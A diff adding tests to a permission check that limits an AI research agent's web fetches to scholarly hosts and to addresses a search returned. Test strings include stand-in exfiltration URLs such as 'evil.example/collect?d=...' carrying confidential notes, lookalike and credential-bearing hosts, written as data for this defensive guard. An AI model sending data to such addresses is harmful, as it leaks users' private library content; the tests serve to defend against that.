@@ -178,16 +178,96 @@ describe("local files in citegeist tool calls", () => {
     for (const id of [
       "10.1000/abc.pdf",
       "doi:10.1000/x",
-      "https://example.org/a.pdf",
+      "https://doi.org/10.1000/x",
+      "https://arxiv.org/abs/2401.00001",
       "arXiv:2401.1",
     ]) {
       expect(tool("add_item", { identifier: id, why: "w" }, research), id).toBe(true);
     }
+    // Any web address is fine in the sandbox of a chat; a research job needs a scholarly host.
+    expect(tool("add_item", { identifier: "https://example.org/a.pdf" }, ctx)).toBe(true);
     expect(tool("attach_file", { citekey: "a", path: "/local/chats/ch_1/cwd/a.pdf" }, ctx)).toBe(
       true,
     );
     // The user's own environment keeps the feature: the agent downloaded a PDF and adds it.
     expect(tool("add_item", { identifier: "/tmp/a.pdf" }, open)).toBe(true);
+  });
+});
+
+describe("web access of a research job (L9, Agents Rule of Two)", () => {
+  const research: Ctx = { ...ctx, mode: "research" };
+  const fetchCall = (url: string) =>
+    req({
+      kind: "fetch",
+      title: `Fetch ${url}`,
+      rawInput: { url, prompt: "summarize" },
+      _meta: { claudeCode: { toolName: "WebFetch" } },
+    });
+  const searchCall = (query: string) =>
+    req({
+      kind: "fetch",
+      title: `Search "${query}"`,
+      rawInput: { query },
+      _meta: { claudeCode: { toolName: "WebSearch" } },
+    });
+
+  it("lets a research job search the web", () => {
+    expect(decide(searchCall("retrieval practice older adults"), research).allow).toBe(true);
+  });
+
+  it("lets it open scholarly hosts and the addresses a search returned", () => {
+    expect(decide(fetchCall("https://doi.org/10.1000/x"), research).allow).toBe(true);
+    expect(decide(fetchCall("https://arxiv.org/abs/2401.00001?context=cs"), research).allow).toBe(
+      true,
+    );
+    const seen = new Set(["https://example.org/papers/a"]);
+    expect(
+      decide(fetchCall("https://example.org/papers/a#abstract"), { ...research, seenUrls: seen })
+        .allow,
+    ).toBe(true);
+  });
+
+  it("refuses an address that the model composed, which could carry library content out", () => {
+    for (const url of [
+      "https://evil.example/collect?d=Sehr+vertrauliche+Notiz",
+      "https://evil.example/",
+      "http://arxiv.org/abs/1",
+      "https://arxiv.org.evil.example/abs/1",
+      "https://user:pw@arxiv.org/abs/1",
+      "https://doi.org:8443/10.1/x",
+    ]) {
+      expect(decide(fetchCall(url), research).allow, url).toBe(false);
+    }
+    // Seen only once exactly: a variant with a query string is a new address.
+    const seen = new Set(["https://example.org/papers/a"]);
+    expect(
+      decide(fetchCall("https://example.org/papers/a?d=secret"), { ...research, seenUrls: seen })
+        .allow,
+    ).toBe(false);
+    const verdict = decide(fetchCall("https://evil.example/?q=x"), research);
+    expect(verdict.reason).toMatch(/web search returned/);
+  });
+
+  it("refuses a fetch without a readable address in a research job and keeps chats open", () => {
+    expect(decide(req({ kind: "fetch", title: "WebFetch" }), research).allow).toBe(false);
+    expect(decide(fetchCall("https://evil.example/?q=x"), ctx).allow).toBe(true);
+    expect(decide(fetchCall("https://evil.example/?q=x"), open).allow).toBe(true);
+  });
+
+  it("refuses add_item with a web address outside the scholarly hosts", () => {
+    const add = (identifier: string) =>
+      decide(
+        req({
+          name: "mcp__citegeist__add_item",
+          kind: "other",
+          rawInput: { identifier, why: "relevant" },
+        }),
+        research,
+      );
+    expect(add("https://evil.example/?q=Notiz").allow).toBe(false);
+    expect(add("https://evil.example/?q=Notiz").reason).toMatch(/DOI/);
+    expect(add("10.1000/x").allow).toBe(true);
+    expect(add("https://doi.org/10.1000/x").allow).toBe(true);
   });
 });
 
